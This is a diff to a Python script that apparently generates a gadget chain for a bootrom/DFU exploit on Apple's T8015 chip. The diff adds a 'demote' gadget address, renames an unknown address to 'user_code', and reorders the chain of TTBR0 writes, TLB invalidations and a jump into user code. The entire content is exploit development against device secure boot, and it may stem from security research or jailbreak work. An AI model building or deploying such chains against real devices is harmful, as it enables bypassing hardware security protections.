@@ -15,7 +15,8 @@ class Variables:
         self.write_ttbr0_fn = 0
         self.tlbi_fn = 0
 
-        self.unknown = 0
+        self.user_code = 0
+        self.demote = 0
 
 
 # TODO: Support more than just T8015.
@@ -26,7 +27,8 @@ vars.func_gadget = 0x10000A9AC
 vars.ret_gadget = 0x100000148
 vars.write_ttbr0_fn = 0x10000045C
 vars.tlbi_fn = 0x1000004AC
-vars.unknown = 0x18201C610
+vars.user_code = 0x18201C610
+vars.demote = 0x100008230
 
 
 def quad_literal(value: int, nl=True) -> str:
@@ -74,9 +76,10 @@ print(
         vars.dfu_base,
         vars.func_gadget,
         [
+            (vars.demote, 0),
             (vars.write_ttbr0_fn, vars.dfu_base),
             (vars.tlbi_fn, 0),
-            (vars.unknown, 0),  # wtf?
+            (vars.user_code, 0),
             (vars.write_ttbr0_fn, vars.insecure_memory_base),
             (vars.tlbi_fn, 0),
             (vars.ret_gadget, 0),
